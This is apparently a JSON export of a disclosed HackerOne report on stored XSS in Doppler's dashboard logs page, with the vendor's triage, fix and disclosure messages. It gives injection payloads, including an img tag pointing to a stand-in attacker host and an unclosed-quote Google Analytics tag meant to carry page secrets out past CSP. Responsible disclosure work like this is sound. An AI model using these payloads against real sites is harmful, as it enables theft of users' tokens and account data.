{"id":1073726,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDczNzI2","url":"https://hackerone.com/reports/1073726","title":"Stored XSS in [https://dashboard.doppler.com/workplace/*/logs] pages","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2021-01-07T19:12:32.748Z","submitted_at":"2021-01-07T19:12:32.806Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kirasys","url":"/kirasys","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":44515,"url":"https://hackerone.com/doppler","handle":"doppler","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/hxAtMcT8LhwYUBjZAzLDyCh7/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/hxAtMcT8LhwYUBjZAzLDyCh7/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Doppler","twitter_handle":"dopplerhq","website":"https://doppler.com","about":"Doppler is a Universal Secrets Manager and your source of truth from local development to production, on any language, stack, or infrastructure."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-01-09T06:55:08.105Z","bug_reporter_agreed_on_going_public_at":"2021-01-09T06:37:00.044Z","team_member_agreed_on_going_public_at":"2021-01-09T06:55:08.024Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nI have found a stored XSS vulnerability in the following config setting page.\n```\nhttps://dashboard.doppler.com/workplace/*/projects/example-project/configs/dev/logs\n```\nWhen you invite other users to the workspace, the xss could be used to exploit other users also.\n\n## Steps To Reproduce:\n1 . Visit https://dashboard.doppler.com/ and create your account\n2 . Create a project and go to any options \n3 . Import secrets the follwing data and click the save button.\n\n```\n{\n\"TEST\":\"{\u003cimg src='https://attack.er'\u003e\u003c/img\u003e}\"\n}\n```\n\n4 .  Import secrets the follwing data and click the save button again. \n\n``` \n{\n\"TEST\":\"{\u003cimg src='https://attack.er'\u003e\u003c/img\u003e1}\"\n} \n```\n\n5 . When you navigate to the LOGS tab, the img tag is inserted.\n\nYon can use the Google Analytics to bypass CSP. Consider the following injected content.\n```\n\u003cimg src='https://www.google-analytics.com/collect?v=1\u0026tid=***\u0026cid=123\u0026t=event\u0026ec=email\u0026el=321\u0026cs=newsletter\u0026cm=email\u0026cn=\u0026cm1=1\u0026ea=\n```\nA tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on the pages such as:\n```\nwindow.bugsnagClient = bugsnag({\n          apiKey: \"*credential*\",\n          releaseStage: \"production\",\n          appType: \"dashboard\",\n          appVersion: \"dbe7317\",\n          autoBreadcrumbs: true,\n          autoCaptureSessions: true,\n          autoNotify: true,\n          collectUserIp: true\n        });\n window.bugsnagClient.user = {\"name\":\"*credential*\",\"email\":\"*credential*\",\"admin\":false, ..};\n or etc..\n```\n\n## Reference:\nhttps://github.blog/2017-01-19-githubs-post-csp-journey/\n\n## Impact\n\nAn attacker could steal credential information such as csrf tokens or account information with this vulnerability.","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1148520,"file_name":"poc.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/deojxsyynoddnpmenl8iekcpkg0i?response-content-disposition=attachment%3B%20filename%3D%22poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132240Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=dc99530f07f883ece1e0166d2bfc2f33ba21eca373eb1938646cfda68aaab1df","file_size":3183456,"type":"video/mp4"}],"allow_singular_disclosure_at":"2021-02-08T06:37:00.093Z","allow_singular_disclosure_after":-21192340.38808228,"singular_disclosure_allowed":true,"vote_count":42,"voters":["derision","prophet","ayoub0x1","eren","mattberg","nipe","dastan_9408","jsec401","h4x0r_dz","kingbenaiah","and 32 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":58435,"asset_type":"URL","asset_identifier":"dashboard.doppler.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10300947,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. This is a great find! We will begin working on a fix and will update you once it has shipped.","automated_response":false,"created_at":"2021-01-08T02:55:52.467Z","updated_at":"2021-01-08T02:55:52.467Z","actor":{"username":"thomas_doppler","cleared":false,"url":"/thomas_doppler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"doppler","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10314160,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"A fix for this issue has just been shipped. We now properly escape this value before inserting it into the DOM. If you can, please verify that this issue is now resolved. Thank again for reporting this finding to us.","automated_response":false,"created_at":"2021-01-09T06:11:46.162Z","updated_at":"2021-01-09T06:11:46.162Z","actor":{"username":"thomas_doppler","cleared":false,"url":"/thomas_doppler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kirasys","url":"/kirasys"},"genius_execution_id":null,"team_handle":"doppler","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10314232,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for your quick response. I checked that the issue has resolved and can we disclose it? ","automated_response":false,"created_at":"2021-01-09T06:37:00.067Z","updated_at":"2021-01-09T06:37:00.067Z","first_to_agree":true,"actor":{"username":"kirasys","cleared":false,"url":"/kirasys","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"doppler","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10314278,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-09T06:55:08.047Z","updated_at":"2021-01-09T06:55:08.047Z","actor":{"username":"thomas_doppler","cleared":false,"url":"/thomas_doppler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"doppler","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10314279,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-09T06:55:08.130Z","updated_at":"2021-01-09T06:55:08.130Z","actor":{"username":"thomas_doppler","cleared":false,"url":"/thomas_doppler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"doppler","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}